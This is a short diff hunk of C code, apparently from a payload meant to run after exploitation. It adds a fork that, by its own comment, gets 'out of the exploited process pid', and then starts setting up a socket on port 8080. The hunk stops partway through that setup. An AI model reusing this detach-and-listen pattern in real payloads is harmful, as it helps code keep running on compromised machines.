@@ -28,11 +28,18 @@ int main(void)
     char inbuf[512];
     size_t rb;
     int out_fd;
-
+    
 #ifdef DAEMON
     daemon(0,1);
+#else
+    //fork to get out of the exploited process pid
+    if(fork())
+    {
+        exit(0);
+    }
 #endif
-
+    
+    
     s4.sin_family=AF_INET;
 
     s4.sin_port=htons(8080);
